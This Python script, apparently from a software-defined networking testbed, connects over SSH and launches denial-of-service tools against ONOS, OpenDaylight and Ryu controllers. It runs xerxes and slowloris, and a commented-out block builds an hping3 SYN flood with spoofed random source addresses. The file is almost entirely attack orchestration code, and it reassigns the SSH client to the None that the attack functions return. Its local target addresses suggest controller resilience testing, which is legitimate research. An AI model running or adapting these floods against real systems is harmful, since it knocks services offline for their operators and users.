import subprocess
import random
import paramiko
import os, time

'''
def DoS(ip, dos_duration, size):
    print('DoS attack starting')
    cmd = ["sudo", "hping3", "-S", "-P", "-U", "--flood", "-V", "--rand-source", str(ip), "-d", str(size)]
    try:
        subprocess.run(cmd, timeout=dos_duration)
    except subprocess.TimeoutExpired:
        print("\nCommand timed out after", dos_duration, "seconds.")
    except Exception as e:
        print(f"Error while executing the command: {e}")
    else:
        print("Command executed successfully.")
'''

def connection(controller_ip):

    try:
        print("Connecting to the controller...")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(controller_ip, username="admin", key_filename="/home/admin/.ssh/id_rsa")
    
    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your credentials.")
    except paramiko.SSHException as ssh_err:
        print(f"SSH error: {ssh_err}")
    except Exception as e:
        print(f"Error: {e}")
            
    return client
            
def run_dos_attack(controller_name, client):
    if controller_name == 'onos':
        target_ip = '172.17.0.2'
        target_port = '9876'
    if controller_name == 'odl' or controller_name == 'ryu':
        target_ip = '127.0.0.1'
        target_port = '6653'
        
    cmd = f"cd XERXES && ./xerxes {target_ip} {target_port} > output.txt 2>&1"
    print("Executing command...")
    stdin, stdout, stderr = client.exec_command(cmd)
    
def stop_connection(client):
    try:
        stop_cmd = "pkill -f xerxes"
        stdin, stdout, stderr = client.exec_command(stop_cmd)
        print("All xerxes processes stopped successfully.")
    except Exception as e:
        print(f"Error stopping xerxes processes: {e}")

    try:
        print("Closing connection...")
        client.close()
        print("Closed")
    except Exception as e:
        print(f"Error while closing connection: {e}")

    

def run_slowloris(controller_name, client):
    if controller_name == 'onos':
        target_ip = '172.17.0.2'
    if controller_name == 'odl' or controller_name == 'ryu':
        target_ip = '127.0.0.1'
        
    cmd = f"sudo slowloris {target_ip}"
    print("Executing command...")
    stdin, stdout, stderr = client.exec_command(cmd)


def initialize(folder, controller_name, controller_ip, rest_port, client):
    '''
    if dos:
        # Get topology information of hosts
        hosts, links = southbound_NN_api.get_topology(controller_name, controller_ip, rest_port)

        # Extract the IP of a random host to attack with DoS - ONOS
        random_ip = random.choice(hosts)['ipAddresses'][0]

        DoS(random_ip)
        print('\n')
    '''
 
    if folder == 'DoS':
        print('DoS attack starting')
        client = run_dos_attack(controller_name, client)


    elif folder =='slowloris':
        '''
        if controller_name == 'onos':
            url = f'http://{controller_ip}:{rest_port}/onos/ui'
        elif controller_name == 'odl':
            url = f'http://{controller_ip}:{rest_port}/index.html'
        elif controller_name =='ryu':
            url = f'http://{controller_ip}:{rest_port}/v1.0/topology/switches'
        cmd = ["sudo", "slowloris", url]
        '''    
        print('DoS Slowloris attack starting')
        client = run_slowloris(controller_name, client)
        



